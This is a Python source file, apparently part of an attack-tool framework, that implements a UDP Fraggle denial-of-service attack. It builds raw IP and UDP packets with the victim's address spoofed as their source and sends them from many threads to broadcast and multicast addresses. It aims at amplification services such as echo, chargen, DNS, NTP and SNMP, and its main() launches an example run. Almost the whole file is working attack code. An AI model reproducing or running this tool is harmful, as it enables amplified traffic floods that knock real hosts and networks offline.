import os
import sys
import struct
import socket
import threading
import time
import random

# Add the current directory to sys.path to handle imports from different execution contexts
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from attack_strategy import AttackStrategy
except ImportError:
    # If direct import fails, try relative import
    from .attack_strategy import AttackStrategy


class UDPFraggle(AttackStrategy):
    """
    Concrete implementation of the AttackStrategy for UDP Fraggle attacks.

    UDP Fraggle is a network amplification attack that exploits the UDP protocol
    by sending UDP packets to broadcast addresses with spoofed source IP addresses.
    This causes all devices on the broadcast network to respond to the target,
    amplifying the attack traffic.

    The attack works by:
    1. Crafting UDP packets with spoofed source IP (victim's IP)
    2. Sending these packets to broadcast addresses
    3. All devices on the broadcast network respond to the spoofed source IP
    4. This creates amplified traffic directed at the victim
    """

    def __init__(
        self, target_ip, target_port=7, duration=60, threads=50, broadcast_networks=None
    ):
        """
        Initialize UDP Fraggle attack parameters.

        Args:
            target_ip (str): The IP address of the target (victim)
            target_port (int): The port to target (default: 7 for echo service)
            duration (int): Duration of the attack in seconds (default: 60)
            threads (int): Number of threads to use for the attack (default: 50)
            broadcast_networks (list): List of broadcast addresses to use for amplification
        """
        super().__init__(target_ip, target_port, duration, threads)

        # Common broadcast networks for amplification
        self.broadcast_networks = broadcast_networks or [
            "192.168.1.255",
            "192.168.0.255",
            "10.0.0.255",
            "172.16.0.255",
            "224.0.0.1",  # All systems multicast
        ]

        # Common UDP services for amplification
        self.target_services = [
            7,  # Echo
            13,  # Daytime
            19,  # CharGen
            37,  # Time
            53,  # DNS
            123,  # NTP
            161,  # SNMP
            137,  # NetBIOS Name Service
            138,  # NetBIOS Datagram Service
        ]

    def _create_ip_header(self, source_ip, dest_ip):
        """
        Create IP header for UDP packet with spoofed source IP.

        IP Header Structure (RFC 791):
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |Version|  IHL  |Type of Service|          Total Length         |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |         Identification        |Flags|      Fragment Offset    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |  Time to Live |    Protocol   |         Header Checksum       |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                       Source Address                          |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                    Destination Address                        |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                    Options                    |    Padding    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        """
        # IP header fields
        version = 4  # IPv4
        ihl = 5  # Internet Header Length (5 * 4 = 20 bytes)
        type_of_service = 0  # Normal service
        total_length = 28  # IP header (20) + UDP header (8) = 28 bytes
        identification = random.randint(1, 65535)
        flags = 0  # No flags set
        fragment_offset = 0  # No fragmentation
        ttl = 64  # Time to live
        protocol = socket.IPPROTO_UDP  # UDP protocol (17)
        checksum = 0  # Will be calculated later

        # Convert IP addresses to binary format
        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)

        # Pack IP header (without checksum)
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,  # Version and IHL
            type_of_service,
            total_length,
            identification,
            (flags << 13) + fragment_offset,
            ttl,
            protocol,
            checksum,
            source_addr,
            dest_addr,
        )

        # Calculate checksum
        checksum = self.checksum(ip_header)

        # Repack with correct checksum
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            type_of_service,
            total_length,
            identification,
            (flags << 13) + fragment_offset,
            ttl,
            protocol,
            checksum,
            source_addr,
            dest_addr,
        )

        return ip_header

    def _create_udp_header(self, source_ip, dest_ip, source_port, dest_port, data):
        """
        Create UDP header with checksum.

        UDP Header Structure (RFC 768):
        0      7 8     15 16    23 24    31
        +--------+--------+--------+--------+
        |     Source      |   Destination   |
        |      Port       |      Port       |
        +--------+--------+--------+--------+
        |                 |                 |
        |     Length      |    Checksum     |
        +--------+--------+--------+--------+
        |
        |          data octets ...
        +---------------- ...
        """
        udp_length = 8 + len(data)  # UDP header (8) + data length
        checksum = 0  # Will be calculated later

        # Pack UDP header (without checksum)
        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)

        # Create pseudo header for checksum calculation
        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_UDP

        pseudo_header = struct.pack(
            "!4s4sBBH", source_addr, dest_addr, placeholder, protocol, udp_length
        )
        pseudo_packet = pseudo_header + udp_header + data

        # Calculate checksum
        checksum = self.checksum(pseudo_packet)

        # Repack with correct checksum
        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)

        return udp_header

    def _send_fraggle_packet(self, broadcast_ip, service_port):
        """
        Send a single UDP Fraggle packet to a broadcast address.

        Args:
            broadcast_ip (str): The broadcast IP address to send to
            service_port (int): The target service port
        """
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Generate spoofed source IP (victim's IP)
            spoofed_ip = self.target_ip

            # Create payload (simple echo request)
            payload = b"FRAGGLE_ATTACK_PAYLOAD"

            # Create headers
            ip_header = self._create_ip_header(spoofed_ip, broadcast_ip)
            udp_header = self._create_udp_header(
                spoofed_ip,
                broadcast_ip,
                random.randint(1024, 65535),
                service_port,
                payload,
            )

            # Combine packet
            packet = ip_header + udp_header + payload

            # Send packet
            sock.sendto(packet, (broadcast_ip, service_port))
            sock.close()

            self.packets_sent += 1

            # Log packet details
            self.logger.debug(
                f"Sent Fraggle packet: {spoofed_ip} -> {broadcast_ip}:{service_port}"
            )

        except Exception as e:
            self.logger.error(
                f"Error sending Fraggle packet to {broadcast_ip}:{service_port}: {e}"
            )

    def _fraggle_worker(self, thread_id):
        """
        Worker thread for continuous UDP Fraggle packet sending.

        Args:
            thread_id (int): Thread identifier
        """
        self.logger.info(f"Fraggle worker thread {thread_id} started")

        while self.attack_active:
            try:
                # Select random broadcast address and service port
                broadcast_ip = random.choice(self.broadcast_networks)
                service_port = random.choice(self.target_services)

                # Send fraggle packet
                self._send_fraggle_packet(broadcast_ip, service_port)

                # Small delay to prevent overwhelming the system
                time.sleep(0.001)

            except Exception as e:
                self.logger.error(f"Error in Fraggle worker thread {thread_id}: {e}")
                time.sleep(0.1)  # Longer delay on error

        self.logger.info(f"Fraggle worker thread {thread_id} stopped")

    def attack(self):
        """
        Execute the UDP Fraggle attack.

        This method orchestrates the entire attack by:
        1. Checking for raw socket privileges
        2. Starting multiple worker threads
        3. Monitoring attack progress
        4. Displaying real-time statistics
        """
        # Check for raw socket privileges
        if not self._check_raw_socket_privileges(socket.IPPROTO_UDP):
            return

        # Display attack header
        self._display_attack_header()

        # Additional attack-specific info
        self._print_info(f"Broadcast networks: {len(self.broadcast_networks)}")
        self._print_info(f"Target services: {len(self.target_services)}")
        self._print_warning(
            "⚠ This attack uses IP spoofing and broadcast amplification"
        )

        # Log attack start
        self.logger.info("UDP Fraggle attack initiated")
        self.logger.info(f"Target: {self.target_ip}:{self.target_port}")
        self.logger.info(f"Broadcast networks: {self.broadcast_networks}")
        self.logger.info(f"Target services: {self.target_services}")

        # Start attack
        self.attack_active = True
        start_time = time.time()

        # Create and start worker threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self._fraggle_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        self._print_success(f"✓ Started {len(threads)} attack threads")

        # Monitor attack progress
        try:
            last_count = 0
            while time.time() - start_time < self.duration:
                time.sleep(1)

                # Calculate current rate
                current_count = self.packets_sent
                rate = current_count - last_count
                last_count = current_count

                # Display progress
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed

                rate_color = self._get_rate_color(rate)
                self._print_colored(
                    f"[{elapsed:6.1f}s] Packets: {current_count:6d} | Rate: {rate:4d} pps | "
                    f"Remaining: {remaining:5.1f}s",
                    rate_color,
                )

                # Log progress
                if current_count % 1000 == 0:
                    self.logger.info(
                        f"Progress: {current_count} packets sent, {rate} pps"
                    )

        except KeyboardInterrupt:
            self._print_warning("\n⚠ Attack interrupted by user")
            self.logger.warning("Attack interrupted by user")

        finally:
            # Stop attack
            self.attack_active = False
            self._print_info("Stopping attack threads...")

            # Wait for threads to complete
            for thread in threads:
                thread.join(timeout=1.0)

            # Display completion statistics
            self._display_attack_completion(start_time)


def main():
    """
    Main function to run the UDP Fraggle attack.
    """
    # Example usage
    target_ip = "192.168.1.100"  # Target IP (victim)
    target_port = 7  # Echo service port
    duration = 30  # 30 seconds
    threads = 20  # 20 threads

    # Custom broadcast networks (optional)
    broadcast_networks = ["192.168.1.255", "10.0.0.255", "172.16.0.255"]

    # Create and execute attack
    attack = UDPFraggle(target_ip, target_port, duration, threads, broadcast_networks)
    attack.attack()


if __name__ == "__main__":
    main()
